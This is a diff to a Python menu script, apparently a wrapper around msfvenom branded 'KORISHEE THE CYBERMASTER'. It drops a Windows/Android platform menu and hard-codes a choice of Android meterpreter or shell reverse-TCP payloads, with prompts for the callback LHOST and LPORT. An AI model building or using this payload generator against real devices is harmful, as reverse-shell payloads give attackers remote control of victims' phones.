@@ -18,37 +18,21 @@ def print_colored_figlet_text(text, color):
     print(colored_text) 
 
 
-def select_platform():
-    print_with_animation(f"{Fore.YELLOW}Choose a platform:")
-    print_with_animation(f"{Fore.BLUE}1. Windows")
-    print_with_animation("2. Android")
-    platform_choice = input("Enter the platform number: ")
-    if platform_choice == '1':
-        return "windows"
-    elif platform_choice == '2':
-        return "android"
-    else:
-        print_with_animation(f"{Fore.RED}Invalid choice. Defaulting to Windows.")
-        return "windows"
 
 
-
-
-
-
-def select_payload(platform):
-    print_with_animation(f"Available payloads for {platform}:")
-   
-        print_with_animation(f"{Fore.GREEN}1. android/meterpreter/reverse_tcp")
-        print_with_animation("2. android/shell/reverse_tcp")
-        payload_choice = input("Enter the payload number: ")
-        if payload_choice == '1':
-            return "android/meterpreter/reverse_tcp"
-        elif payload_choice == '2':
-            return "android/shell/reverse_tcp"
-    else:
-    	print_with_animation(f"{Fore.RED}Invalid choice.Defaulting to android/meterpreter/reverse_tcp.")
+def select_payload():
+    print_with_animation(f"Available payloads for Android:")
+    print_with_animation(f"{Fore.GREEN}1. android/meterpreter/reverse_tcp")
+    print_with_animation("2. android/shell/reverse_tcp")
+    payload_choice = input("Enter the payload number: ")
+    if payload_choice == '1':
         return "android/meterpreter/reverse_tcp"
+    elif payload_choice == '2':
+        return "android/shell/reverse_tcp"
+    else:
+        print_with_animation(f"{Fore.RED}Invalid choice. Defaulting to android/meterpreter/reverse_tcp.")
+        return "android/meterpreter/reverse_tcp"
+    
 
 def generate_payload():
     print_colored_figlet_text("KORISHEE THE CYBERMASTER", Fore.GREEN)
@@ -59,10 +43,10 @@ def generate_payload():
     print_with_animation(f"{Fore.YELLOW}Let's generate a payload using msfvenom.")
     
     # Ask for the platform first
-    platform = select_platform()
+    
 
     # Select the payload based on the platform
-    payload = select_payload(platform)
+    payload = select_payload()
 
     lhost = input("Enter the LHOST (e.g., 192.168.1.100): ")
     lport = input("Enter the LPORT (e.g., 4444): ")
